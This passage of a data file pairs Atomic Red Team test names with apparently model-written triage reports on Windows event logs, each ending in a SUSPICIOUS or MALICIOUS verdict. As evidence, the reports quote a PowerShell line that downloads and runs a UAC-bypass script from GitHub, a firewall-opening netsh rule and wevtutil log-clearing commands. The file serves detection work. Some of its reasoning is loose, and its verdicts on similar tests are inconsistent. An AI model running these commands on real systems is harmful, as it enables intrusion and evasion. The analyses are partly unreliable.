   - Logs around the `MicrosoftEdgeUpdate.exe` processes are consistent with the regular updating and registry of Microsoft Edge services. Operations executed under `NT AUTHORITY\SYSTEM` can be confirmed as routine updates, reflecting automated update sequences.

5. **Wevtutil Log Commands:**
   - Commands executed using `wevtutil.exe` involved clearing specified logs (Sysmon, Application, System, Security), aligning with the observed log clearing events.

### Assessment:
Based on the examination, the activities largely seem to be coherent with known simulation exercises prevalent in security testing (specifically the Atomic Red Team framework). The PowerShell command and MSI installation align with benign testing practices designed to evaluate security monitoring and response capabilities. However, log clearing in an unapproved context is a red flag and, without additional context, could be construed as suspicious.

### Resolution:
- **Resolution:** **SUSPICIOUS**

### Guidance:
- **Verify Authorization:** Confirm with relevant stakeholders or security teams if these activities were authorized testing actions. Obtain verified test scopes and authorized testers' details.
- **Monitor Log Clearing:** Investigate the rationale for the log clearing activities to ensure they were sanctioned. If not part of a controlled test or maintenance, treat as potential indicators of compromise.
- **Alert System Admins:** Notify systems administrators to ensure they are aware of such tests or to review actions for potential unauthorized accesses.
- **Audit and Documentation:** Maintain comprehensive documentation of these events, including user activity and any third-party tools involved, for historical and auditing purposes. 

Conclusively, while benign-seeming due to the context, these actions should be examined further to ensure no unauthorized activities occurred under the guise of simulated tests."
Disable Windows Toast Notifications,"Upon analyzing the provided Windows event logs from various channels (System, Security, Sysmon, and Application), a few key observations can be noted as indicators of potentially suspicious or malicious activities. Let's examine these below:

1. **Clearing of Event Logs**: 
   - The logs show multiple instances across different channels where event logs have been cleared (`EventID: 104` in the System log, Event ID `1102` in the Security log). This action was performed by the user ""admin_test"". Clearing event logs can be an indicator of malicious activity, as it is often performed by attackers to cover their tracks and remove evidence of their presence or actions.

2. **Use of Wevtutil.exe**:
   - Sysmon logs show that `wevtutil.exe` was executed multiple times with the `cl` command to clear event logs across different channels (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Windows PowerShell`, and `Security`). The `wevtutil` command line tool is used for managing event logs, and its use in conjunction with clearing logs is highly suspicious, especially when executed by a user in a high-integrity context without a clear business justification.

3. **Command-Line Activity**:
   - A command is executed using `cmd.exe` to modify the registry (`reg add`) related to Windows notifications (`ToastEnabled`). This may not inherently be malicious but, given the context of other suspicious activity (like log clearing), it should be investigated further to understand its intent.

4. **Activity Context**:
   - All the suspicious activities are performed under the context of the user ""admin_test"", indicating privileged access. There is ultimately a need to validate the legitimacy of the actions performed by this user, especially those involving the clearance of logs.

5. **Parent-Child Process Relationships**:
   - Observation of processes such as `cmd.exe` handling registry keys in conjunction with `wevtutil.exe` indicates scripted or automated actions. While these commands are typically used in administrative tasks, their suspicious use pattern and association with event log clearing heighten security concerns.

**Assessment**:
- The behavior observed in the logs, particularly the clearing of logs across various channels using `wevtutil.exe`, is strongly indicative of attempts to cover activities that may be malicious in nature.
- The context in which these tools are used alongside the access level (high integrity) suggests inappropriate or unauthorized access activities by ""admin_test"".

**Resolution**: **MALICIOUS**
- The observed behaviors align with common techniques used by attackers to obfuscate their actions post-compromise.
  
**Guidance and Next Steps**:
1. **Immediate Action**: Isolate the affected host (""Server002"") to prevent potential lateral movement within the network.
2. **Investigate User ""admin_test""**: Check authentication logs and recent activity for this user across other systems to ascertain whether the user is compromised or acting maliciously.
3. **Forensic Analysis**: Perform a deeper forensic investigation on ""Server002"" to search for potential persistence mechanisms, data exfiltration, and other indicators of compromise.
4. **Review and Reinforce Logging Policies**: Ensure logging policies and access controls are in place to prevent unauthorized clearing or modification of logs in the future.
5. **Alert and Educate IT/Security Teams**: Inform relevant teams about the incident and share insights for proactive monitoring against similar activities. 

By following these steps, the organization can minimize risks, understand the breach details, and further bolster defenses against such activities in the future."
Obfuscated Command in PowerShell,"Upon reviewing the logs provided, there are several key points and observations where suspicious or potential malicious activities might be evident. Below is the detailed analysis of these observations:

### Analysis of Logs

1. **Log File Clearing:**
   - The most notable concern is the presence of multiple events related to log file clearing using `wevtutil`. Specifically, the events with IDs 104 and 1102 indicate that logs from the ""System,"" ""Application,"" ""Security,"" and ""Windows PowerShell"" channels were cleared by the user `admin_test`. 
   - The execution of ""wevtutil"" follows the pattern `""C:\\Windows\\system32\\wevtutil.exe"" cl [LogName]`, which is used to clear logs. This is suspicious because clearing event logs can be an attempt to cover malicious activities.

2. **PowerShell Activity:**
   - There are multiple entries in the PowerShell log showing obfuscated commands. The obfuscation of PowerShell commands, especially with character alterations like `[CHAR]` and base64 encoded scripts or string concatenation, is a common tactic used by malware to evade detection. The command `powershell.exe & { $cmDwhy =...` indicates an attempt to execute something without direct readability.

3. **Suspicious Time Change:**
   - Events related to system time changes (Event ID 4616 in the Security log) indicate the manipulation of system time, which can be a tactic to avoid detection based on time stamps.

4. **Credential and Account Access:**
   - Multiple security logs (Event ID 5379) show failed attempts or accesses related to a Microsoft account and Windows Live tokens/certificates. The return code `3221226021` is indicative of access failures, but multiple such attempts can signal a credential access attempt, either brute-forcing or misconfiguration, which requires further investigation.

5. **Processes and Integrity Level:**
   - The execution of `whoami.exe`, `hostname.exe`, and other commands from directories not typically associated with routine system-level scripts or process listings (`C:\\Users\\admin_test\\Documents\\`) could signal reconnaissance activity. 
   - Additionally, those processes are running with high integrity levels, indicating elevated privileges that an attacker might attempt to obtain for greater access.

6. **Integration with Updates:**
   - Numerous `Sysmon` logs show legitimate Windows Update and Microsoft Defender updates. Although these processes are benign by themselves, the context in which they occur (e.g., post-log clearing) is suspicious, possibly used as a disguise under the pretext of routine updates.


### Assessment

Given these indicators, my assessment is:

- **Resolution: MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Steps:**
   - Isolate the affected host (Server002) from the network to prevent any further potentially malicious activity.
   - Perform a forensic analysis to ascertain the extent of the compromise, with special attention to data integrity and any evidence that might have been modified or deleted.
   - Review and potentially revoke any accessed or misused credentials, especially those of `admin_test`.

2. **Long-term Actions:**
   - Implement stricter access controls and logging policies, ensuring logs are forwarded to a central repository inaccessible to regular users.
   - Conduct a thorough security review and implement endpoint detection systems to monitor for similar activities in the future.
   - Consider resetting passwords organization-wide if there's an indication that credentials might have been compromised.

3. **Investigation Steps:**
   - Use additional tools like EDR (Endpoint Detection and Response) solutions to look for traces of the obfuscated PowerShell command execution and any residual artifacts from the malicious activities.

By taking these steps, the organization can mitigate the current issue and protect against future incidents of a similar nature."
WinPwn - UAC Bypass DccwBypassUAC technique,"Upon detailed analysis of the provided Windows event logs, several indicators suggest the presence of potentially malicious activity. The investigation reveals:

1. **Event Logs Cleared**: The logs indicate that event logs for the System, Security, and Windows PowerShell have been cleared around the same timestamp (e.g., EventID 104 in the system log and EventID 1102 in the security log by user ""admin_test""). Clearing event logs is a classic indicator of an attempt to obfuscate tracks following illicit activity.

2. **Suspicious PowerShell Activity**: There are multiple entries from the PowerShell event logs (EventID 600) showing the execution of a potentially harmful script via PowerShell using the command:
   ```
   powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')}
   ```
   This specific command downloads and executes a script from a non-corporate network source, which is a typical method used by attackers to execute PowerShell scripts remotely.

3. **Sysmon Entries on Process Execution**: The Sysmon logs contain instances where `wevtutil.exe` has been used to clear logs, matching with log-clearing activity. We also see `powershell.exe` launching with the command to download and execute scripts from a remote source, corresponding with the suspicious PowerShell entries.

4. **Time Manipulation**: There are security (EventID 4616) and kernel (EventID 1) events indicating the system time was changed to a past time, which might suggest an attempt to align timestamps to mislead log monitoring or alerts.

These considerations point strongly to malicious activity, particularly emphasizing the PowerShell script execution and log clearing as significant indicators of compromise. 

### Assessment:
Based on the evidence collected from the event logs, the activities are indicative of a compromise, where the adversary has attempted to execute a potentially harmful script through PowerShell and thereafter clear logs to cover their actions.

### Resolution: MALICIOUS

### Guidance on How to Proceed:
1. **Immediate Containment**: Disconnect the affected host (Server002) from the network to prevent further spread of potential malicious activity.

2. **Detailed Forensic Analysis**: Perform detailed forensic analysis, focusing on the downloaded script and any other unauthorized changes on the system.

3. **Review Access Logs**: Check for unauthorized access, particularly from the user account ""admin_test,"" and ensure audit logging is re-enabled.

4. **Patch and Update**: Ensure all systems are up to date with the latest security patches to protect against exploited vulnerabilities.

5. **Strengthen Security Policy**: Implement or reinforce strict PowerShell execution policies and user account permissions.

6. **User Awareness and Training**: Conduct cybersecurity training and awareness programs for users to help identify suspicious activities.

7. **Incident Reporting**: Report the incident to appropriate authorities or security vendors if necessary, for further analysis and guidance.

8. **Review and Improve Security Posture**: After resolution, review and update security measures to prevent similar incidents in the future, including improved monitoring, alerting, and response procedures."
InstallUtil Install method call,"Based on the provided event logs from various Windows components, including Security, PowerShell, Sysmon, System, and Application, the following analysis is provided:

### Suspicious or Anomalous Behavior:
1. **Windows Event Log Clearance (Event ID 1102 & 104)**: Multiple logs indicate that event logs were cleared, which is a significant red flag. The ""Security,"" ""Windows PowerShell,"" and ""System"" logs being cleared by the user ""admin_test"" indicates an attempt to cover tracks. Log clearing could be indicative of malicious activity, especially when performed by a user with potentially unauthorized actions.

2. **Execution of PowerShell Scripts (PowerShell Event ID 600 and 800 logs)**: PowerShell scripts are being executed with constructs that are typically seen in post-exploitation frameworks. The specific script file `InstallUtilTestHarness.ps1` located in a temporary directory aligns with known techniques (Atomic Red Team's T1218.004 - InstallUtil) for executing malicious payloads disguised as legitimate administrative tasks. The usage of `Add-Type` in PowerShell to define and compile .NET assemblies can be leveraged for code execution.

3. **Use of Wevtutil.exe (Sysmon Event ID 1 and 5)**: The `wevtutil.exe cl` command clears specific event logs and is observed in the logs corresponding to privilege escalation or maintaining persistence via stealth. It is executed by the same user (""admin_test""), suggesting that this user account may have been compromised.

4. **Creation and Execution of .NET Assemblies (Sysmon Event ID 1 with csc.exe and InstallUtil.exe)**: The logs show the compilation and usage of command-line C# compiler (csc.exe) and InstallUtil.exe, both can be used to run .NET executables for various purposes, including malware deployment.

5. **Edge Update and Microsoft Edge Utility Processes (Sysmon Event ID 1 and 5)**: While updating software is usually benign, the timing and context (in conjunction with malicious PowerShell and event clearance activities) can highlight the possibility of unusual behaviors associated with those processes. However, they are not distinctly malicious by themselves.

### Assessment:
These activities collectively suggest a strong indication of malicious activity. The presence of log clearance, usage of PowerShell scripts from a temporary path for building and executing .NET assemblies, and the overarching alignment with known attack techniques indicate a compromise scenario possibly involving sophisticated post-exploitation.

### Resolution:
- **MALICIOUS**: The events in the logs are consistent with known indicators of compromise, specifically involving potential privilege escalation, evasion tactics (log clearing), and the use of valid binaries in a malicious context (indicative of tactics associated with living-off-the-land binaries and scripts).

### Guidance:
1. **User Account Review**: Investigate the account ""admin_test"" for unauthorized access or abuse. Reset credentials and enforce multifactor authentication.
2. **Audit Logs**: Increase auditing levels and monitor for further suspicious activities. Prevent future tampering by restricting log clearing permissions.
3. **Network Traffic**: Inspect outbound and inbound traffic for data exfiltration or suspicious C2 communications.
4. **Endpoint Security**: Deploy threat hunting tools to identify and isolate any additional persistence mechanisms or malicious binaries/scripts on the host.
5. **Incident Response**: Escalate the investigation to incident response. Consider initiating containment and eradication procedures to secure the affected system. Document findings for further analysis and longer-term security posture improvements."
Scarab Ransomware Defense Evasion Activities,"Upon reviewing the provided logs, several points suggest potential anomalous or suspicious activity warranting further investigation:

1. **Event Log Clearing**: The logs show events indicating that the security, application, system, and Windows PowerShell event logs were cleared (Event ID 1102, 104). This action is commonly linked with attempts to hide malicious or unauthorized activities since clearing logs can erase evidence crucial for forensic investigations.

2. **Timestamp Discrepancy**: There is evidence of timestamps being altered around the same time logs were cleared. Specifically, Event ID 4616 (security log) and the Kernel-General events in the system log indicate an update or change in system time. This type of timestamp manipulation can be linked with attempts to remove or obfuscate traces of malicious activity. 

3. **Execution of `wevtutil.exe`**: The logs contain multiple instances of the `wevtutil.exe` command being executed to clear various event channels (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, and `cl ""Windows PowerShell""`). The use of `wevtutil.exe` in this manner is consistent with the clearing of event logs seen earlier, reinforcing the attempt to cover tracks.

4. **Registry Modification**: The logs capture an event where `cmd.exe` is used to modify the Windows registry key related to CredSSP parameters (`HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters`). This could potentially compromise system security, especially if modified to weaken Remote Desktop Protocol (RDP) session security.

5. **Privileged Actions**: The execution context and the privilege escalation activities need closer inspection:
   - User `admin_test` has executed commands with `High` integrity level and using several high-level privileges (`SeDebugPrivilege`, `SeSecurityPrivilege`, etc.), as seen in Event ID 4672.
   - The actions and modifications performed indicate a level of access beyond typical administrative functions and towards administrative-level privilege escalation.

In light of these findings, the following assessment can be made:

**Resolution: MALICIOUS**

The activities detected reflect multiple common tactics associated with malicious actors:
- System and security evasion by log clearing and timestamp manipulation.
- Registry manipulation to potentially decrease security measures.
- Use of elevated privileges within a high-integrity session context.

**Guidance on How to Proceed:**
1. **Isolate the affected system** to prevent any further potential lateral movement within the network.
2. **Conduct a disk forensic analysis** to recover and analyze deleted logs, files, and any remnants of malicious activities that were attempted to be obscured.
3. **Review all active sessions and recently used credentials**, especially for the `admin_test` account and other privileged accounts. Consider resetting passwords as necessary.
4. **Initiate a detailed incident response** to understand the scope and impact of the observed activities and investigate other systems for similar patterns.
5. **Implement stricter logging measures and monitoring** for any unusual activities moving forward.

Given the potential coordinated nature of these actions, it could also be beneficial to correlate with network-level logs and integrate findings into a broader incident response plan."
Opening ports for proxy - HARDRAIN,"Based on the provided event logs analysis, there are several activities that require attention and analysis. Here's a breakdown of the notable entries:

### Suspicious or Anomalous Behavior:

1. **Event Log Clearing**:
   - In the Security log and System log, there are entries indicating log clearing activities:
     - Security Log was cleared by the user ""admin_test"" at `2024-10-28 11:41:25.4963662` with `EventID: 1102`.
     - System Log was cleared by the user ""admin_test"" as indicated in the `System Log` with `EventID: 104`.
     - Windows PowerShell Log was cleared by the user ""admin_test"" as indicated in the `System Log` with `EventID: 104`.

   Log clearing is a critical indicator that someone is attempting to hide their tracks, a common tactic used following unauthorized actions.

2. **Command and Control Indicators**:
   - There is a pattern of using `wevtutil.exe` to modify event logs, frequently with high integrity levels.
   - Usage of `netsh.exe` through `cmd.exe` to add firewall rules, using the command line:
     ```
     ""cmd.exe"" /c netsh advfirewall firewall add rule name=""atomic testing"" action=allow dir=in protocol=TCP localport=450
     ```
   - Creating a firewall rule is highly suspicious, especially using vague rule names such as ""atomic testing"". This might be used to allow inbound traffic which can be malicious if not justified by an admin.

3. **Potential Privilege Escalation**:
   - Processes being run under high integrity levels, especially with modifications to firewall and system logs, suggests an attempt to maintain elevated privileges.

4. **Execution of Utility Commands**:
   - The `whoami.exe` and `hostname.exe` commands are used often for recon activities. They might have legitimate uses, but their combination with other behaviors is suspicious.

5. **Anomalies in Time Settings**:
   - There are multiple entries indicating the manipulation of system time, which could involve attempts to cover tracks or manipulate time-based events on the system.

### Malicious Activity Indicators:

- High integrity, frequent execution of administrative commands (`wevtutil.exe` clearing logs, `netsh.exe` modifying firewall rules).
- Clearing of multiple system logs shortly after modifying system configurations.
- Command-line executions and parent-child processes showing execution chains originating from `wsmprovhost.exe`, a Windows Service known for running remote management tasks. 

### Assessment and Resolution:

Given the patterns observed, the activities appear to be deliberate attempts to manipulate system configurations, alter firewall rules for potentially unauthorized access, and clear logs to erase traces of these actions. The coordinated use of administrative tools, changes to system configurations, and log clearing are textbook indicators of a security breach.

### Final Resolution: **MALICIOUS**

#### Guidance on How to Proceed:
- Immediately isolate the host `Server002` from the network.
- Conduct a comprehensive forensic analysis to understand the scope of the breach.
- Review user account ""admin_test"" for unauthorized access or compromises.
- Restoring logs from backup copies to assess the timeline and activities prior to log clearing.
- Strengthening firewall policies and monitoring for any unauthorized rule changes.
- Notify incident response teams to manage and contain any potential breaches.
- Consider applying patches and conducting security reviews to protect against future breaches."
ProtocolHandler.exe Downloaded a Suspicious File,"**Analysis of Provided Windows Event Logs:**

**Application Log Analysis:**
- The application logs mainly show the stopping of services related to edge updates, which is typical behavior during updates or shutdowns of services.

**Security Log Analysis:**
- A Security log event with EventID 1102 shows that the security event log was cleared by the user `admin_test`. This action is often suspicious as clearing logs can be an attempt to hide unauthorized actions. Notably, the user and the process IDs are aligned with this event, indicating that it is likely the same user involved in other entries.

**Sysmon Log Analysis:**
- There are numerous logs related to Windows processes (`whoami.exe`, `cmd.exe`, `powershell.exe`, and `wevtutil.exe`). The use of `wevtutil.exe` to clear event logs (as indicated by the command to clear logs like `Security`, `System`, etc.) and the presence of PowerShell instances suggest potential manipulation and log-clearing.
- There is an execution of a command through `cmd.exe` that indirectly comes from a potential Atomic Red Team test (as suggested by the GitHub URL `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx`). This is a known tool used for testing security control efficacy, which is generally benign if conducted by authorized personnel, but suspicious if unauthorized.
- Multiple instances of `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup.exe` are observed, which aligns with typical system update routines.
- Sysmon EventID 1 indicates process creations, with a focus on Microsoft Edge Update tasks, though these appear as expected operations for software maintenance routines.

**System Log Analysis:**
- Similar to the Security logs, EventID 104 shows that multiple event logs (System and Windows PowerShell) were cleared. This behavior is suspicious, especially since similar clearing was observed in the Security logs simultaneously.

**Conclusion:**
Upon examining the logs, the following points stand out:
- Clearing of logs by `admin_test` is highly suspicious as it may indicate an attempt to erase evidence of potentially malicious actions. 
- Execution of PowerShell and Windows Command Processor (CMD) in the context of queries and atomic test artifacts is suspicious when not sanctioned for testing purposes.
- Usage of `wevtutil.exe` to clear logs typically signifies intent to hide traces of activity.

**Resolution: SUSPICIOUS**
- The activity related to clearing the logs, especially the security logs, is typically not standard practice unless part of a legitimate administrative task, and should be further investigated.
- It is advised to confirm if the observed activity was part of legitimate testing or maintenance activities conducted by an authorized individual or team.
- If unauthorized or unexplained, a deeper investigation into potential unauthorized access or policy violations is necessary. Consider isolating the system for further forensic analysis.

**Guidance:**
- Review access policies and alert if others attempt similar actions.
- Verify the legitimacy of users conducting operations and ensure they have the appropriate permissions.
- Track down the source of potentially unauthorized PowerShell and CMD activities for further investigation."
Bypass UAC using sdclt DelegateExecute,"**Detailed Analysis of Logs:**

1. **Clearing of Event Logs:**
   - Security EventID 1102 and System EventID 104 indicate that event logs were cleared by the user ""admin_test"". Clearing logs is often an attempt to cover malicious activity, especially when done manually and not as part of routine maintenance.

2. **Privilege Use and Services:**
   - Security EventID 4672 shows ""SYSTEM"" was assigned high privileges, which can be normal for system processes. However, it merits attention due to the context surrounded by suspicious log clearing and PowerShell activity.

3. **PowerShell Activity:**
   - Multiple PowerShell EventID 600 entries show script execution with potentially malicious intent. The script attempts to modify registry keys to establish persistence (e.g., configuring a command execution chain involving ‘notepad.exe’ via ‘cmd.exe’, and using `sdclt.exe` to bypass UAC).

4. **Sysmon Events:**
   - Numerous processes are spawning in quick succession using `wevtutil.exe` to clear logs. This is a red flag indicating potential log tampering.

5. **Anomalous PowerShell Command:**
   - Sysmon EventIDs 17977 and 17978 demonstrate PowerShell execution with suspicious command lines designed to execute commands via manipulated registry settings and sdclt.exe. This often indicates privilege escalation techniques.

6. **Logons and Process Executions:**
   - EventID 4624 details logon activity with type 5, which could indicate a service start operation. Event 4616 involving time changes could indicate an attempt to disrupt or manipulate scheduled tasks.

**Threat Assessment and Conclusion:**

The logs collectively indicate suspicious and potentially malicious activity:
- The clearing of logs by ""admin_test"".
- PowerShell commands indicating potential persistence and privilege escalation attempts.
- Extensive use of `wevtutil.exe` likely to obfuscate activity by clearing event logs.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

MSXSL Bypass using local files,"Upon examining the provided Windows event logs, several indicators suggest possible malicious activity that warrants further investigation.

1. **Log Clearing Activities**:
   - **Security Log Cleared (Event ID 1102)**: The security log was cleared by the user `admin_test`. The clearing of event logs, especially security logs, is a significant indicator of malicious activity as it can be an attempt to cover tracks.
   - **System and Windows PowerShell Logs Cleared (Event ID 104)**: Similar log-clearing events were noted in the system of the Windows PowerShell channels. This action further corroborates malicious intent, as clearing these logs is not a routine or benign activity.

2. **Suspicious Command Execution**:
   - **Usage of `wevtutil.exe` (Sysmon Event ID 1)**: Several entries show the execution of the Windows Event Utility (`wevtutil.exe`) with commands to clear logs from multiple channels such as Sysmon, Application, System, and Security. This is often associated with attempts to erase evidence of unauthorized activity.
   - **Presence of Powershell and CMD executing with suspicious paths (Sysmon Event ID 1)**: The usage of PowerShell and CMD in connection with paths related to `AtomicRedTeam` and `msxsl.exe` suggests the execution of scripts that could potentially indicate internal testing or preparation for an exploit.

3. **Privilege Escalation**:
   - **Event ID 4672**: This event logs accounts granted high privilege rights. The use of privileges such as SeDebugPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, etc., suggests an intention to execute tasks that require elevated permissions, possibly leading to privilege escalation.

4. **Unusual Process Activity**:
   - The consistent rapid execution of processes like `wevtutil.exe`, `conhost.exe`, and other command-line interactions suggests automation, potentially through scripted commands designed to carry out a sequence of activities stealthily.

**Assessment and Resolution**:
- **Resolution**: MALICIOUS
- The collection of actions, specifically log clearance, scripted interactions with inherently suspicious path executions, elevated privileges, and process executions tied to known attack methodologies or frameworks, strongly suggests these logs indicate malicious activity.

**Guidance on How to Proceed**:
- Conduct a thorough forensic investigation to identify other compromised hosts within the network.
- Isolate affected systems to prevent further damage.
- Review all user accounts and security settings, emphasizing accounts showing unusual privileges.
- Investigate the origin of the suspicious scripts and pathways to discern entry vector.

CMSTP Executing UAC Bypass,"### Summary Analysis:

Upon reviewing the provided logs, the following suspicious activities were identified:

1. **Event Log Clearing:**
   - The **Windows Event Log** contains multiple entries (EventID: 104) suggesting that the logs for ""System"" and ""Windows PowerShell"" channels have been cleared, which is commonly associated with attempts to cover tracks post-malicious activity. The user account involved in these actions is ""admin_test"" (EventRecordID 3572 & 3573).

2. **Usage of Wevtutil:**
   - In the **Sysmon logs**, multiple occurrences of the `wevtutil.exe` command were detected (EventID: 1). This utility was used to clear various Windows logs (e.g., System, Application, Security). The execution of `wevtutil.exe` for clearing logs further corroborates attempts to eliminate evidence.

3. **Potential UAC Bypass (Cmstp.exe):**
   - A suspicious command related to `cmstp.exe` was noticed in the Sysmon log (EventID: 17989). The command-line indicates using `cmstp.exe` with an INF file, typically employed in UAC bypass techniques (seen in atomic red team testing like T1218.003 referenced in the logs).

4. **Admin Logons:**
   - There are several logon events (EventID: 4624) in the **Security logs** involving the user ""admin_test"" with a Network Logon Type 3. This alone is not inherently suspicious, but in combination with the log clearance, it suggests activity that merits further investigation.

### Assessment:

- **Malicious Indicators:** The combination of log clearing activities, particularly targeting crucial logs like System and Security, and the usage of potential UAC bypass techniques are strong indicators of malicious intent or activity.
   
- **Threats/Risks:**
  - The presence of executed commands to clear event logs implies an effort to hide actions, which aligns with typical behavior following unauthorized or malicious activities.
  - The `cmstp.exe` usage suggests a potential elevation of privileges without consent.

### Recommended Actions:

- **Resolution: MALICIOUS:** The combination of evidence indicates a highly probable malicious activity on the host:
  1. Investigate the user account ""admin_test"" for unauthorized access or anomalous behaviors.
  2. Analyze system integrity for any unauthorized changes or installed malicious payloads.
  3. Review broader network activity for lateral movement or further compromises.
  4. Consider quarantining the affected host until a deep forensic investigation is completed.

Remove Network Share PowerShell,"Upon reviewing the provided Windows event logs, several activities raise concerns, which can potentially indicate suspicious or malicious behavior. Here are the key points of analysis:

1. **Clearing of Event Logs:**
   - **System Log (Event ID 104):** The event logs show that the `wevtutil` command was used to clear the System, Windows PowerShell, and Sysmon operational logs. The use of `wevtutil cl` to clear logs, especially without a backup path, is typically done to cover up malicious activities, as it deletes any traces left on the system.
   - **Security Log (Event ID 1102):** The Security log was also cleared by the `admin_test` user. The clearing of security logs suggests an attempt to cover tracks since this log contains critical security information such as login attempts and privilege usage.

2. **Suspicious PowerShell Activity:**
   - **Command Execution:** The execution of PowerShell with the following command: `Remove-SmbShare -Name \\test\share, Remove-FileShare -Name \\test\share`. Removing SMB shares can disrupt services and potentially indicates lateral movement or data exfiltration by a malicious actor.

3. **Time Change Events:**
   - **Security Log (Event ID 4616):** There are events showing changes in system time. While this can be a result of legitimate processes like time synchronization, if paired with other suspicious activities, it might suggest attempts to disrupt timestamp-based defenses or investigations.

4. **Integrity Level and User Context:**
   - **Sysmon Logs:** Various processes executed with a high integrity level under the `admin_test` user. This integrity level and user context, when combined with other findings (like log clearing), are indicative of potentially unauthorized privilege escalation activities.

5. **Unexpected Network Activity:**
   - The use of processes such as `MicrosoftEdgeUpdate.exe` is common for legitimate updates, but given the context of other activities such as system log clearing, continuous execution without parental chain explanation can be considered suspicious and should be auditing for confirmation.

**Threat Assessment and Guidance:**

- **Resolution: MALICIOUS**
  - The combined indicators from administrative user activity such as log clearing using `wevtutil`, unauthorized command execution in PowerShell, and potential tampering of time records strongly suggest malicious activity.
  - Immediate actions should be taken to isolate the affected host to prevent further damage or data exfiltration.
  - Conduct a thorough forensic analysis to determine the full scope of the compromise.
  - Consider resetting passwords, especially for high-privilege accounts, and review patches and security measures to prevent further incidents.
  - Enhance monitoring and implement stricter logging policies to detect and record suspicious activities more consistently."
Stop and Remove Arbitrary Security Windows Service,"Upon examining the provided logs, several observations can be made highlighting potential suspicious activity, as well as benign behaviors:

### Observations:

1. **Event Log Clearing:**
   - The Security (EventID 1102) and System logs (EventID 104) have been cleared by the user `admin_test`. This behavior is often associated with an attempt to cover tracks after malicious actions, but it can also be a legitimate administrative task.

2. **PowerShell Activity:**
   - A PowerShell command `powershell.exe & {Stop-Service -Name McAfeeDLPAgentService, Remove-Service -Name McAfeeDLPAgentService}` was executed. This command stops and removes a potentially critical security service related to McAfee, which is indicative of potentially malicious activity aimed at disabling security mechanisms.

3. **Use of `wevtutil` Tool:**
   - The utility `wevtutil` was used by `admin_test` to clear logs, visible multiple times in the Sysmon logs. This is suspicious when coupled with the log clearing events.

4. **Privileged Tokens:**
   - Event with ID 4672 indicates a new logon session with special privileges, including `SeDebugPrivilege` and `SeImpersonatePrivilege`. While not inherently malicious, these privileges can facilitate operating system level compromises when misused.

5. **Service Stopping (Application Log):**
   - `edgeupdate` services were stopped. Although service startups and shutdowns can be normal, they may coincide with other suspicious activities, indicating an operational concern.

6. **Multiple System Executions:**
   - Numerous system utilities like `taskhostw.exe`, `MusNotification.exe`, and various sysmon-related activities are seen. These utilities are common, but should be reviewed within the context of other activities.

### Assessment:

The combined actions of event log clearing, disabling of a security product via PowerShell, and the use of privileged operations present strong indications of potentially malicious activity on `Server002`.

### Resolution:
- **MALICIOUS**: The presence of activities that suggest an attempt to perform unauthorized and potentially damaging operations (stopping a security service and clearing logs) leads to the conclusion that the logs contain clear indicators of compromise.

### Guidance on How to Proceed:
1. **Immediate Action:**
   - Isolate `Server002` from the network to prevent further potential spread or data exfiltration.
   
2. **Investigate User `admin_test`:**
   - Confirm if `admin_test` legitimately performed these activities, or if their credentials have been compromised.
   
3. **Examine Related Systems:**
   - Inspect other systems for similar activities and indicators of compromise, especially regarding the same user or service actions.

4. **Restore and Fortify:**
   - Restore any disabled security services and strengthen monitoring on critical service changes and PowerShell activities.

5. **Audit Logs and Access:**
   - Conduct a full review of event and access logs across the network for recent suspicious activities to scope the breadth of the incident."
Activate Windows NoSetTaskbar Group Policy Feature,"Upon reviewing the provided Windows event logs, several points of interest and suspicious activities were noted:

1. **Log Clearing Activity:**
   - **Security Log (EventID 1102)**: The entry for event ID 1102 indicates that the security event log was cleared by a user with the username `admin_test`. This activity is suspicious as log clearing can be an indication of an attempt to cover one's tracks after performing unauthorized or malicious actions.

2. **Event Logs Cleared:**
   - **System Log (EventID 104)**: Similar entries indicating that the ""System"" and ""Windows PowerShell"" logs were cleared by the same user `admin_test` are present. This adds to the suspicion for the same reason—clearing these logs without a clear and legitimate purpose is often associated with malicious activities.

3. **Usage of `wevtutil`:** 
   - The logs show the usage of `wevtutil.exe` by the user `admin_test` to clear various event logs: Security, System, and Application logs (as seen in the Sysmon logs). This utility is often used to manage and query event logs, but using it to clear logs is peculiar if not done for maintenance with proper documentation and legitimate cause.

4. **Registry Modification via CMD/Scripts:**
   - A command was executed using `cmd.exe` to add a registry key (`NoSetTaskbar`) under `HKEY_CURRENT_USER`, which is tied to the registry console tool `reg.exe`. This kind of action can be an indicator of an attempt to manipulate the system behavior or prepare the system for further exploitation.

5. **Time Change Activity:**
   - The changing of time (EventID 1 in the system log) detected in the logs could indicate attempts to manipulate time-related system settings to evade logging and monitoring efforts.

6. **Consistency in User and Process IDs:**
   - The consistent usage of the user `admin_test` across these suspicious actions suggests a focused attempt by this account, authorized or compromised, in carrying out these activities.

Given these points, there are clear indicators of potentially malicious activity, particularly due to the clearing of event logs, which is a typical post-exploitation step in intrusions aimed at maintaining persistence or avoiding detection.

**Resolution: MALICIOUS**
- **Assessment:** The logs indicate malicious activity with a high certainty due to event log clearing and suspicious registry modifications.
- **Threats/Risks:** There is a high risk that the system or network could be compromised. This behavior threatens data integrity, confidentiality, and system availability by potentially masking underlying unauthorized activities.
- **Guidance to Proceed:** Immediate actions should include:
  - Isolate the host `Server002` for further forensic analysis.
  - Conduct a full security audit and review access controls for the account `admin_test`.
  - Review any other systems or users for similar activities or compromises.
  - Restore the system logs, if possible, from backups to understand the actions taken by the user prior to log clearance.
  - Reinforce monitoring and implement additional security controls to detect and prevent further unauthorized log clearing or registry modifications."
Indicator Manipulation using FSUtil,"After analyzing the provided Windows event logs, there are several indicators that suggest suspicious activity. Let's break down the findings:

1. **Security Log Analysis**:
   - The event `1102` indicates that the security log was cleared by a user named `admin_test`. Clearing event logs is commonly associated with attempts to conceal malicious activities.
